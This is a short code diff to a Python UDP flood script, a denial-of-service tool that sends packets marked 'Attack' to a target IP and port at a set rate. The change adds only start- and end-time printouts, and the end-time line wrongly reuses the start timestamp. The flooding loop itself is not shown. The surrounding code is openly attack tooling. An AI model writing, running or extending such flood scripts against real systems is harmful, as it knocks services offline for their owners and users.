@@ -20,8 +20,10 @@ PACKET_RATE = 1000  # Packets per second
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 message = b'Attack'
+current_time = time.time()
 
 print(f"Starting UDP flood on {TARGET_IP}:{TARGET_PORT}")
+print(f"Attack started at {time.strftime('%H:%M:%S', time.localtime(current_time))}.")
 print(f"Duration: {DURATION} seconds")
 print(f"Packet rate: {PACKET_RATE} packets/second")
 
@@ -36,3 +38,4 @@ except KeyboardInterrupt:
     sys.exit(0)
 
 print("UDP flood completed.")
+print(f"Attack ended at {time.strftime('%H:%M:%S', time.localtime(current_time))}.")
